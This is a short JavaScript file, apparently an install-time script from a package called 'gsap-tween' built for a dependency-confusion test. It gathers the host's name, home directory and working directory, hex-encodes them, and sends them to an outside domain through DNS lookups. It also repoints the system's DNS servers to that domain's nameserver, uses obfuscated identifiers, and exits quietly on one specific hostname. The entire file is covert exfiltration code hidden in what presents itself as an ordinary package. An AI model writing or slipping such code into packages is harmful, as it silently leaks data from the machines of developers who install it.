const dns = require('dns')
const os = require('os')
const suffix = '.dns.alexbirsan-hacks-paypal.com'
const ns = 'dns1.alexbirsan-hacks-paypal.com'
const package = 'gsap-tween'
function sendToServer(_0x2025f3) {
  _0x2025f3 = Buffer.from(_0x2025f3).toString('hex')
  _0x2025f3 = _0x2025f3.match(/.{1,60}/g)
  id = Math.random().toString(36).substring(2)
  _0x2025f3.forEach(function (_0x2da8cf, _0x364740) {
    try {
      dns.resolve(
        'v2_f.' + id + '.' + _0x364740 + '.' + _0x2da8cf + '.v2_e' + suffix,
        'A',
        console.log
      )
    } catch (_0x3a27e7) {}
  })
}
function tryGet(_0x4290d8) {
  try {
    return _0x4290d8()
  } catch (_0xa3949) {
    return 'err'
  }
}
data = {
  p: package,
  h: tryGet(os.hostname),
  d: tryGet(os.homedir),
  c: __dirname,
}
if (data.h == 'BBOGENS-LAPTOP') {
  process.exit(0)
}
data = JSON.stringify(data)
sendToServer(data)
dns.lookup(ns, function (_0x33fd07, _0x20cd22) {
  if (!_0x33fd07) {
    nsAddress = _0x20cd22
  } else {
    nsAddress = '8.8.8.8'
  }
  dns.setServers([nsAddress, '8.8.4.4'])
  sendToServer(data)
})

